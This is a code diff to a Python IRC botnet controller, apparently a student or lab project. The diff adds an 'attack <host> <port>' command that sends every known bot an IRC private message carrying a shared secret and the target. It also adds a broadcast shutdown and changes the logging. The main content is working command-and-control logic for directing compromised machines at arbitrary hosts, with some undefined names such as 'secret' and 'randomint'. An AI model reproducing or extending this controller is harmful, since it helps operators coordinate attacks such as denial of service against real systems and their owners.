@@ -54,28 +54,25 @@ class ConBot:
 
     def logSend(self, msg):
         msg = bytes(msg)
-        print("--> sending: " + str(msg))
+        eprint("--> sending: {0}{1}{2}".format(colors.BLUE, str(msg), colors.ENDC))
         self._socket.send(msg)
 
     def logRecv(self):
         response = self._socket.recv(1024).decode("utf-8")
-        print("<-- received: " + str(response))
+        eprint("<-- received: {0}{1}{2}".format(colors.WARNING, response, colors.ENDC))
         responses = response.split("\r\n")
         return responses[:len(responses) - 1]
 
     def initConnection(self):
+        """ attempts to register with the server with specified nickname.o """
         self.logSend("NICK {}\r\n".format(self._nick).encode("utf-8"))
-
-        ##change this to be a randomized name per bot, note nick is their identifying feature,
-        ## not the name
         self.logSend("USER {0} 0 * :{1}\r\n".format(self._nick, self._nick).encode("utf-8"))
-        #self.logSend("JOIN {}\r\n".format(self._channel).encode("utf-8"))
         
     def debugLogResponse(self, prefix, command, args):
         """ """
-        print("prefix: {0}".format(prefix))
-        print("command: {0}".format(command))
-        print("args: {0}".format(args))
+        eprint("prefix: {0}".format(prefix))
+        eprint("command: {0}".format(command))
+        eprint("args: {0}".format(args))
 
     def doWork(self):
         """ """
@@ -96,7 +93,7 @@ class ConBot:
                         self.logSend("JOIN {}\r\n".format(self._channel).encode("utf-8"))
                     elif command == "433":
                         #username taken
-                        self._nick = self._nick + str(randomint(1, 1000))
+                        self._nick = self._nick + str(randomint(1, 10))
                         self.initConnection()
                     elif command == "QUIT":
                         #TODO check if it was one of our bots and remove from bot list
@@ -119,8 +116,8 @@ class ConBot:
                     pass
                     
         except:
-            print("!! response loop ending")
-            print(traceback.format_exc())
+            eprint("!! response loop ending")
+            eprint(traceback.format_exc())
 
 
     def knownBot(self, botName):
@@ -129,8 +126,33 @@ class ConBot:
                 return True
 
         return False
-            
 
+    def attack(self, commandParts):
+        """ handles attack command """
+        if len(self._bots) == 0:
+            print("!! No known bots. Use the [status] command to find bots")
+        else:
+            if len(commandParts) != 3:
+                print("Invalid command syntax. Syntax is attack <host> <port>")
+            else:
+                try:
+                    command = commandParts[0]
+                    host = commandParts[1]
+                    port = int(commandParts[2])
+                    
+                    for bot in self._bots:
+                        msg = "PRIVMSG {0} :{1} {2} {3} {4}\r\n".format(bot, secret, command, host, port).encode('utf-8')
+                        self.logSend(msg)
+
+                except ValueError:
+                    print("Invalid port number. Must be between 1 and 65535.")
+
+    '''
+    def shutdown(self, command):
+       
+    '''
+            
+                                                               
     def status(self):
         self._bots = []
         msg = "PRIVMSG {0} :{1}\r\n".format(self._channel, "heyyy what up mah glip glops?").encode('utf-8')
@@ -142,15 +164,21 @@ class ConBot:
         for bot in self._bots:
             print("{0}{1}{2}".format(colors.WARNING, bot, colors.ENDC))
 
-    def shutdown(self):
+    def quit(self):
         self._running = False
-        self._socket.send("KILL".encode("utf-8"))
+        self._socket.send("QUIT\r\n".encode("utf-8"))
+            
+    def shutdown(self, command):
+        for bot in self._bots:
+            msg = "PRIVMSG {0} :{1} {2}\r\n".format(bot, secret, command).encode('utf-8')
+            self.logSend(msg)
 
+        
     def __del__(self):
         try:
-            socket.close()    
-        except:
-            eprint("Error closing socket, might not have been initialized")
+            self._socket.close()
+        finally:
+            eprint("Controller shutting down.")
 
 def handleCommands(controller):
     """
@@ -162,19 +190,20 @@ def handleCommands(controller):
     command = sys.stdin.readline()
     while command != '':
         command = command.strip("\r\n")
+        commandParts = command.split()
 
-        if command == "status":
+        if commandParts[0] == "status":
             print("status!")
             controller.status()
-        elif command == "attack":
+        elif commandParts[0] == "attack":
             print("attack!")
-        elif command == "quit":            
-            print("quit!")
-            controller.shutdown()
+            controller.attack(commandParts)                                                           
+        elif commandParts[0] == "quit":
+            controller.quit()
             break;
-        elif command == "shutdown":
+        elif commandParts[0] == "shutdown":
             print("shutdown!")
-            controller.shutdown()
+            controller.shutdown(commandParts[0])
             break;
         else:
             print("Invalid command!");
@@ -211,5 +240,4 @@ if __name__ == "__main__":
         except:
             eprint("An error occured. Please ensure valid parameters")
             eprint(traceback.format_exc())
-        finally:
-            eprint("Shutting Down...")
+
